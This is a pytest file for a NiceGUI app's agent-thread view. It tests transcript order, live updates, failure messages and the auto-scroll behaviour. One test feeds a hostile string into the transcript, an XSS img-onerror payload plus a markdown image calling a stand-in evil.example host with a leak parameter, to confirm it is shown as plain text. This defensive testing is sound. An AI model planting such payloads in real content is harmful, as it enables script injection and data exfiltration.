"""A thread shows the agent's full transcript, live, and follows it unless the user scrolls up."""

from typing import Any

import pytest
from nicegui import ElementFilter, ui
from nicegui.testing import User

from manyminds.core.errors import ModelError
from manyminds.core.models import ErrorKind, JobEventKind
from manyminds.core.ports import Progress
from support import RecordingModel, start_all

THINKING = "I should look for the official opening date first,\nthen check who measured the span."
SOURCES = "example.org: The bridge opened to traffic in March 1932."
MESSAGE = "Two archives agree on 1932. Neither says anything about its length."

LATE = [
    Progress(JobEventKind.THINKING, THINKING),
    Progress(JobEventKind.SEARCHING, "bridge opening date"),
    Progress(JobEventKind.SOURCES_FOUND, SOURCES),
    Progress(JobEventKind.MESSAGE, MESSAGE),
]

# What the browser reports about the transcript's scroll position.
AT_END = {"verticalPosition": 1400, "verticalSize": 2000, "verticalContainerSize": 600}
SCROLLED_UP = {"verticalPosition": 100, "verticalSize": 2000, "verticalContainerSize": 600}
# The content grew by 600 pixels and the position did not move.
GREW_WHILE_AT_END = {"verticalPosition": 1400, "verticalSize": 2600, "verticalContainerSize": 600}
GREW_WHILE_SCROLLED_UP = {
    "verticalPosition": 100,
    "verticalSize": 2600,
    "verticalContainerSize": 600,
}
# The page has just been laid out and the request to jump to the end has not landed yet.
FIRST_LAYOUT = {"verticalPosition": 0, "verticalSize": 2000, "verticalContainerSize": 600}


def scroll_event(vertical: dict[str, int]) -> dict[str, int]:
    return {
        **vertical,
        "verticalPercentage": 0,
        "horizontalPosition": 0,
        "horizontalPercentage": 0,
        "horizontalSize": 0,
        "horizontalContainerSize": 0,
    }


@pytest.fixture
def scrolls(monkeypatch: pytest.MonkeyPatch) -> list[dict[str, Any]]:
    """Record every request to move the transcript's scroll position."""
    calls: list[dict[str, Any]] = []
    monkeypatch.setattr(ui.scroll_area, "scroll_to", lambda self, **options: calls.append(options))
    return calls


async def open_first_thread(user: User, model: RecordingModel, *, hold: bool) -> None:
    model.hold = hold
    model.late_progress["Lead A"] = LATE
    await user.open("/")
    user.find(marker="composer").type("The bridge opened in 1932.")
    user.find("Generate leads").click()
    await user.should_see(marker="lead-list")
    start_all(user)
    await user.should_see(marker="thread-row-0")
    if not hold:
        with user.scope(marker="thread-row-0"):
            await user.should_see("Finished")
    user.find(marker="thread-row-0").click()
    await user.should_see("Started")


def transcript_texts(user: User) -> list[str]:
    with user:
        return [label.text for label in ElementFilter(kind=ui.label, marker="transcript-text")]


async def test_a_finished_thread_shows_the_whole_transcript_in_order(
    user: User, model: RecordingModel
) -> None:
    await open_first_thread(user, model, hold=False)

    assert transcript_texts(user) == [
        "Started",
        "Searching: query for Lead A",
        THINKING,
        "Searching: bridge opening date",
        SOURCES,
        MESSAGE,
        "Findings handed back",
    ]


async def test_the_report_comes_after_the_transcript(user: User, model: RecordingModel) -> None:
    await open_first_thread(user, model, hold=False)

    await user.should_see("Findings")
    await user.should_see("Findings about: Lead A")
    with user:
        (area,) = ElementFilter(kind=ui.scroll_area)
        inside = [label.text for label in ElementFilter(kind=ui.label).within(instance=area)]
    assert inside.index("Findings handed back") < inside.index("Findings")
    assert inside.index("Findings") < inside.index("Findings about: Lead A")


async def test_thinking_and_sources_are_labelled_as_such(user: User, model: RecordingModel) -> None:
    await open_first_thread(user, model, hold=False)

    await user.should_see("Thinking")
    await user.should_see("Sources found")


async def test_new_entries_are_added_live_without_rebuilding_earlier_ones(
    user: User, model: RecordingModel
) -> None:
    await open_first_thread(user, model, hold=True)
    assert transcript_texts(user) == ["Started", "Searching: query for Lead A"]
    with user:
        before = [label.id for label in ElementFilter(kind=ui.label, marker="transcript-text")]

    model.release("Lead A")
    await user.should_see(MESSAGE)
    await user.should_see("Findings")

    with user:
        after = [label.id for label in ElementFilter(kind=ui.label, marker="transcript-text")]
    assert after[:2] == before
    assert len(after) == 7


async def test_a_failed_thread_ends_its_transcript_with_the_reason(
    user: User, model: RecordingModel
) -> None:
    model.failures = {"Lead A": ModelError(ErrorKind.PROVIDER, "Upstream error")}
    await open_first_thread(user, model, hold=True)

    model.release("Lead A")
    await user.should_see("Failed")

    assert transcript_texts(user)[-1] == "Stopped: Upstream error"
    await user.should_not_see(marker="findings")


async def test_transcript_text_is_shown_as_plain_text(user: User, model: RecordingModel) -> None:
    hostile = '<img src=x onerror="alert(1)"> ![x](https://evil.example/?leak=1)'
    model.hold = False
    await open_first_thread(user, model, hold=False)
    model.late_progress["Lead B"] = [
        Progress(JobEventKind.THINKING, hostile),
        Progress(JobEventKind.SOURCES_FOUND, hostile),
        Progress(JobEventKind.MESSAGE, hostile),
    ]
    await user.open("/")
    user.find(marker="composer").type("Another claim.")
    user.find("Generate leads").click()
    await user.should_see(marker="lead-list")
    start_all(user)
    await user.should_see(marker="thread-row-0")
    with user.scope(marker="thread-row-1"):
        await user.should_see("Finished")
    user.find(marker="thread-row-1").click()
    await user.should_see("Findings handed back")

    # Thinking and notes are formatted, so the image syntax becomes a link; the markup that
    # comes before it is still shown as the text it is.
    markup = '<img src=x onerror="alert(1)">'
    assert len([text for text in transcript_texts(user) if markup in text]) == 3
    with user:
        assert list(ElementFilter(kind=ui.html)) == []
        assert list(ElementFilter(kind=ui.markdown)) == []
        assert list(ElementFilter(kind=ui.image)) == []


def report(user: User, position: dict[str, int]) -> None:
    """Have the browser report a scroll position for the transcript."""
    user.find(kind=ui.scroll_area).trigger("scroll", scroll_event(position))


async def test_opening_a_thread_jumps_to_the_end(
    user: User, model: RecordingModel, scrolls: list[dict[str, Any]]
) -> None:
    await open_first_thread(user, model, hold=False)

    assert scrolls
    assert all(call == {"percent": 1.0} for call in scrolls)


async def test_the_jump_is_repeated_once_the_page_has_been_laid_out(
    user: User, model: RecordingModel, scrolls: list[dict[str, Any]]
) -> None:
    await open_first_thread(user, model, hold=False)
    seen_on_open = len(scrolls)

    report(user, FIRST_LAYOUT)

    assert len(scrolls) == seen_on_open + 1
    assert scrolls[-1] == {"percent": 1.0}


async def test_the_view_follows_when_the_content_grows(
    user: User, model: RecordingModel, scrolls: list[dict[str, Any]]
) -> None:
    await open_first_thread(user, model, hold=True)
    report(user, AT_END)
    seen_before = len(scrolls)

    model.release("Lead A")
    await user.should_see("Findings")
    report(user, GREW_WHILE_AT_END)

    assert len(scrolls) > seen_before
    assert scrolls[-1] == {"percent": 1.0}


async def test_being_at_the_end_asks_for_no_further_movement(
    user: User, model: RecordingModel, scrolls: list[dict[str, Any]]
) -> None:
    await open_first_thread(user, model, hold=False)
    seen_on_open = len(scrolls)

    report(user, AT_END)
    report(user, AT_END)

    assert len(scrolls) == seen_on_open


async def test_scrolling_up_stops_the_view_from_following(
    user: User, model: RecordingModel, scrolls: list[dict[str, Any]]
) -> None:
    await open_first_thread(user, model, hold=True)
    report(user, AT_END)

    report(user, SCROLLED_UP)
    seen_before = len(scrolls)
    model.release("Lead A")
    await user.should_see("Findings")
    report(user, GREW_WHILE_SCROLLED_UP)

    assert len(scrolls) == seen_before
    assert len(transcript_texts(user)) == 7


async def test_returning_to_the_end_resumes_following(
    user: User, model: RecordingModel, scrolls: list[dict[str, Any]]
) -> None:
    await open_first_thread(user, model, hold=True)
    report(user, AT_END)
    report(user, SCROLLED_UP)

    report(user, AT_END)
    seen_before = len(scrolls)
    model.release("Lead A")
    await user.should_see("Findings")
    report(user, GREW_WHILE_AT_END)

    assert len(scrolls) > seen_before
    assert scrolls[-1] == {"percent": 1.0}
